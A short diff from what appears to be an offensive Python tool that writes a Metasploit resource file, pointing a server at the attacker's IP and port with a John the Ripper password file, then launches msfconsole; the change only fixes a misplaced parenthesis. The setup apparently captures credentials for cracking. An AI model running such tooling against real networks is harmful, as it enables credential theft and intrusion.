@@ -20,7 +20,7 @@ set SRVHOST <SERVER>
 set SRVPORT <PORT>
 set JOHNPWFILE passwords
 run
-'''.replace('<SERVER>',ipAttacker)).replace('<PORT>',portAttacker)
+'''.replace('<SERVER>',ipAttacker).replace('<PORT>',portAttacker))
 	resourceFile.close()
 	print('[+] MSF Resource file generated ')
 	system('msfconsole -q -r metasploit.rc')
